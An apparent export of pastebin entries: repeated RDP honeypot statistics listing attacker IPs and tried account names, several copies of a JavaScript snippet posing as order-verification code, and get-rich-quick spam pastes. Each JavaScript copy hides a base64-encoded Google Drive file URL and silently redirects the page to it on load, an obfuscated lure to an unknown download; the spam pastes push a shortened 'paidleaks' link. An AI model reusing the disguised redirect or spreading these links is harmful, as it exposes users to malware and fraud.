id,title,username,language,date,content
35hD2TCD,2025-04-04_stats.json,rdp_snitch,JSON,Saturday 5th of April 2025 07:18:22 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 63501,
    ""156.146.57.110"": 34326,
    ""156.146.57.174"": 8592,
    ""150.95.89.149"": 8574,
    ""138.199.24.30"": 8526,
    ""156.146.57.52"": 8610,
    ""147.182.229.114"": 105,
    ""146.190.105.191"": 2580,
    ""106.14.144.233"": 426,
    ""58.218.199.219"": 18,
    ""194.164.107.4"": 30,
    ""185.147.124.177"": 9,
    ""167.94.138.118"": 3,
    ""205.210.31.221"": 9,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""185.147.124.165"": 9,
    ""198.235.24.99"": 9,
    ""92.255.85.92"": 3,
    ""198.12.89.161"": 9,
    ""20.151.163.246"": 6,
    ""198.235.24.235"": 9,
    ""121.134.238.166"": 3,
    ""42.96.5.120"": 3,
    ""103.171.175.21"": 84,
    ""88.214.25.124"": 6,
    ""91.238.181.96"": 6,
    ""147.185.132.222"": 9
  },
  ""asn"": {
    ""AS60068"": 72027,
    ""AS212238"": 51528,
    ""AS135161"": 8574,
    ""AS14061"": 2685,
    ""AS37963"": 426,
    ""AS4134"": 18,
    ""AS50219"": 30,
    ""AS49505"": 18,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS48721"": 6,
    ""AS49434"": 12,
    ""AS207566"": 3,
    ""AS36352"": 9,
    ""AS8075"": 6,
    ""AS4766"": 3,
    ""AS135967"": 3,
    ""AS151734"": 84,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DataCamp Limited"": 72027,
    ""Datacamp Limited"": 51528,
    ""GMO-Z.COM PTE. LTD."": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Chinanet"": 18,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""JSC Selectel"": 18,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 12,
    ""Chang Way Technologies Co. Limited"": 3,
    ""HostPapa"": 9,
    ""Microsoft Corporation"": 6,
    ""Korea Telecom"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Webyne Data Centre Private Limited"": 84,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Cdn77 SGP"": 72027,
    ""Datacamp Limited"": 51528,
    ""Zcom Thai"": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Aliyun Computing Co., LTD"": 426,
    ""Chinanet JS"": 18,
    ""Valence Technology Co"": 30,
    ""Almira LLC"": 18,
    ""Censys, Inc"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unknown"": 93,
    ""Microsoft Azure Cloud (canadacentral)"": 6,
    ""Kornet"": 3,
    ""Bach Kim Network solutions Join stock company"": 3
  },
  ""regionName"": {
    ""North West"": 123585,
    ""Tokyo"": 8574,
    ""California"": 141,
    ""South West"": 2580,
    ""Shanghai"": 426,
    ""Jiangsu"": 18,
    ""Moscow"": 21,
    ""Michigan"": 3,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 12,
    ""New York"": 9,
    ""Ontario"": 6,
    ""Seoul"": 3,
    ""Ninh B\u00ecnh Province"": 3,
    ""Tamil Nadu"": 84,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 126165,
    ""Japan"": 8574,
    ""United States"": 153,
    ""China"": 444,
    ""Russia"": 21,
    ""Lithuania"": 6,
    ""France"": 12,
    ""Canada"": 6,
    ""South Korea"": 3,
    ""Vietnam"": 3,
    ""India"": 84,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 135348,
    ""eltons"": 15,
    ""administr"": 15,
    ""Domain"": 27,
    ""(empty)"": 9,
    ""nKBnjirwm"": 3,
    ""oUAGhu"": 3,
    ""LbgnfO"": 3,
    ""Test"": 27,
    ""xcoByLBGo"": 3,
    ""afVfWn"": 3,
    ""xSJiGO"": 3,
    ""HFzHxRVkA"": 3,
    ""vFXbZf"": 3,
    ""nebnzw"": 3,
    ""JoOLDQGCN"": 3,
    ""fHMojH"": 3,
    ""SOrhae"": 3
  },
  ""keyboard"": {
    ""Unknown"": 135477
  },
  ""client_build"": {
    ""Unknown"": 135477
  },
  ""client_name"": {
    ""Unknown"": 135477
  },
  ""ip_type"": {
    ""hosting & proxy"": 126666,
    ""hosting"": 8655,
    ""proxy"": 21,
    ""Unknown"": 135
  }
}"
LkncLDaj,Market.js,jm33,JavaScript,Saturday 5th of April 2025 07:18:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12330/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xyj2nAjC,Make $1000 15-MINUTES (BEGINNER) RQ,fedello66,JavaScript,Saturday 5th of April 2025 07:16:44 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


32eoaG9V6F
"
LAfGQpCR,2025-04-04_stats.json,rdp_snitch,JSON,Saturday 5th of April 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 63500,
    ""156.146.57.110"": 34324,
    ""156.146.57.174"": 8592,
    ""150.95.89.149"": 8574,
    ""138.199.24.30"": 8526,
    ""156.146.57.52"": 8610,
    ""147.182.229.114"": 105,
    ""146.190.105.191"": 2580,
    ""106.14.144.233"": 426,
    ""58.218.199.219"": 18,
    ""194.164.107.4"": 30,
    ""185.147.124.177"": 9,
    ""167.94.138.118"": 3,
    ""205.210.31.221"": 9,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""185.147.124.165"": 9,
    ""198.235.24.99"": 9,
    ""92.255.85.92"": 3,
    ""198.12.89.161"": 9,
    ""20.151.163.246"": 6,
    ""198.235.24.235"": 9,
    ""121.134.238.166"": 3,
    ""42.96.5.120"": 3,
    ""103.171.175.21"": 84,
    ""88.214.25.124"": 6,
    ""91.238.181.96"": 6,
    ""147.185.132.222"": 9
  },
  ""asn"": {
    ""AS60068"": 72026,
    ""AS212238"": 51526,
    ""AS135161"": 8574,
    ""AS14061"": 2685,
    ""AS37963"": 426,
    ""AS4134"": 18,
    ""AS50219"": 30,
    ""AS49505"": 18,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS48721"": 6,
    ""AS49434"": 12,
    ""AS207566"": 3,
    ""AS36352"": 9,
    ""AS8075"": 6,
    ""AS4766"": 3,
    ""AS135967"": 3,
    ""AS151734"": 84,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DataCamp Limited"": 72026,
    ""Datacamp Limited"": 51526,
    ""GMO-Z.COM PTE. LTD."": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Chinanet"": 18,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""JSC Selectel"": 18,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 12,
    ""Chang Way Technologies Co. Limited"": 3,
    ""HostPapa"": 9,
    ""Microsoft Corporation"": 6,
    ""Korea Telecom"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Webyne Data Centre Private Limited"": 84,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Cdn77 SGP"": 72026,
    ""Datacamp Limited"": 51526,
    ""Zcom Thai"": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Aliyun Computing Co., LTD"": 426,
    ""Chinanet JS"": 18,
    ""Valence Technology Co"": 30,
    ""Almira LLC"": 18,
    ""Censys, Inc"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unknown"": 93,
    ""Microsoft Azure Cloud (canadacentral)"": 6,
    ""Kornet"": 3,
    ""Bach Kim Network solutions Join stock company"": 3
  },
  ""regionName"": {
    ""North West"": 123582,
    ""Tokyo"": 8574,
    ""California"": 141,
    ""South West"": 2580,
    ""Shanghai"": 426,
    ""Jiangsu"": 18,
    ""Moscow"": 21,
    ""Michigan"": 3,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 12,
    ""New York"": 9,
    ""Ontario"": 6,
    ""Seoul"": 3,
    ""Ninh B\u00ecnh Province"": 3,
    ""Tamil Nadu"": 84,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 126162,
    ""Japan"": 8574,
    ""United States"": 153,
    ""China"": 444,
    ""Russia"": 21,
    ""Lithuania"": 6,
    ""France"": 12,
    ""Canada"": 6,
    ""South Korea"": 3,
    ""Vietnam"": 3,
    ""India"": 84,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 135345,
    ""eltons"": 15,
    ""administr"": 15,
    ""Domain"": 27,
    ""(empty)"": 9,
    ""nKBnjirwm"": 3,
    ""oUAGhu"": 3,
    ""LbgnfO"": 3,
    ""Test"": 27,
    ""xcoByLBGo"": 3,
    ""afVfWn"": 3,
    ""xSJiGO"": 3,
    ""HFzHxRVkA"": 3,
    ""vFXbZf"": 3,
    ""nebnzw"": 3,
    ""JoOLDQGCN"": 3,
    ""fHMojH"": 3,
    ""SOrhae"": 3
  },
  ""keyboard"": {
    ""Unknown"": 135474
  },
  ""client_build"": {
    ""Unknown"": 135474
  },
  ""client_name"": {
    ""Unknown"": 135474
  },
  ""ip_type"": {
    ""hosting & proxy"": 126663,
    ""hosting"": 8655,
    ""proxy"": 21,
    ""Unknown"": 135
  }
}"
bBVcz9ks,2025-04-04_stats.json,rdp_snitch,JSON,Saturday 5th of April 2025 07:15:16 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 63499,
    ""156.146.57.110"": 34322,
    ""156.146.57.174"": 8592,
    ""150.95.89.149"": 8574,
    ""138.199.24.30"": 8526,
    ""156.146.57.52"": 8610,
    ""147.182.229.114"": 105,
    ""146.190.105.191"": 2580,
    ""106.14.144.233"": 426,
    ""58.218.199.219"": 18,
    ""194.164.107.4"": 30,
    ""185.147.124.177"": 9,
    ""167.94.138.118"": 3,
    ""205.210.31.221"": 9,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""185.147.124.165"": 9,
    ""198.235.24.99"": 9,
    ""92.255.85.92"": 3,
    ""198.12.89.161"": 9,
    ""20.151.163.246"": 6,
    ""198.235.24.235"": 9,
    ""121.134.238.166"": 3,
    ""42.96.5.120"": 3,
    ""103.171.175.21"": 84,
    ""88.214.25.124"": 6,
    ""91.238.181.96"": 6,
    ""147.185.132.222"": 9
  },
  ""asn"": {
    ""AS60068"": 72025,
    ""AS212238"": 51524,
    ""AS135161"": 8574,
    ""AS14061"": 2685,
    ""AS37963"": 426,
    ""AS4134"": 18,
    ""AS50219"": 30,
    ""AS49505"": 18,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS48721"": 6,
    ""AS49434"": 12,
    ""AS207566"": 3,
    ""AS36352"": 9,
    ""AS8075"": 6,
    ""AS4766"": 3,
    ""AS135967"": 3,
    ""AS151734"": 84,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DataCamp Limited"": 72025,
    ""Datacamp Limited"": 51524,
    ""GMO-Z.COM PTE. LTD."": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Chinanet"": 18,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""JSC Selectel"": 18,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 12,
    ""Chang Way Technologies Co. Limited"": 3,
    ""HostPapa"": 9,
    ""Microsoft Corporation"": 6,
    ""Korea Telecom"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Webyne Data Centre Private Limited"": 84,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Cdn77 SGP"": 72025,
    ""Datacamp Limited"": 51524,
    ""Zcom Thai"": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Aliyun Computing Co., LTD"": 426,
    ""Chinanet JS"": 18,
    ""Valence Technology Co"": 30,
    ""Almira LLC"": 18,
    ""Censys, Inc"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unknown"": 93,
    ""Microsoft Azure Cloud (canadacentral)"": 6,
    ""Kornet"": 3,
    ""Bach Kim Network solutions Join stock company"": 3
  },
  ""regionName"": {
    ""North West"": 123579,
    ""Tokyo"": 8574,
    ""California"": 141,
    ""South West"": 2580,
    ""Shanghai"": 426,
    ""Jiangsu"": 18,
    ""Moscow"": 21,
    ""Michigan"": 3,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 12,
    ""New York"": 9,
    ""Ontario"": 6,
    ""Seoul"": 3,
    ""Ninh B\u00ecnh Province"": 3,
    ""Tamil Nadu"": 84,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 126159,
    ""Japan"": 8574,
    ""United States"": 153,
    ""China"": 444,
    ""Russia"": 21,
    ""Lithuania"": 6,
    ""France"": 12,
    ""Canada"": 6,
    ""South Korea"": 3,
    ""Vietnam"": 3,
    ""India"": 84,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 135342,
    ""eltons"": 15,
    ""administr"": 15,
    ""Domain"": 27,
    ""(empty)"": 9,
    ""nKBnjirwm"": 3,
    ""oUAGhu"": 3,
    ""LbgnfO"": 3,
    ""Test"": 27,
    ""xcoByLBGo"": 3,
    ""afVfWn"": 3,
    ""xSJiGO"": 3,
    ""HFzHxRVkA"": 3,
    ""vFXbZf"": 3,
    ""nebnzw"": 3,
    ""JoOLDQGCN"": 3,
    ""fHMojH"": 3,
    ""SOrhae"": 3
  },
  ""keyboard"": {
    ""Unknown"": 135471
  },
  ""client_build"": {
    ""Unknown"": 135471
  },
  ""client_name"": {
    ""Unknown"": 135471
  },
  ""ip_type"": {
    ""hosting & proxy"": 126660,
    ""hosting"": 8655,
    ""proxy"": 21,
    ""Unknown"": 135
  }
}"
S1tPVs0m,Untitled,jm33,JavaScript,Saturday 5th of April 2025 07:02:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56080/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ChMrLLLA,EARN $900 INSTANTLY 2025 V9,raheemrule,JavaScript,Saturday 5th of April 2025 07:00:02 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


BGcE5ZezN7
"
EujHAW4w,Products.js,jm33,JavaScript,Saturday 5th of April 2025 06:47:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22601/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
p5z02P73,Make $1000 15-MINUTES (BEGINNER) RV,raheemrule,JavaScript,Saturday 5th of April 2025 06:44:08 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


C5AJv3bmbl
"
9zFCNaWJ,Order.js,jm33,JavaScript,Saturday 5th of April 2025 06:32:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11378/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
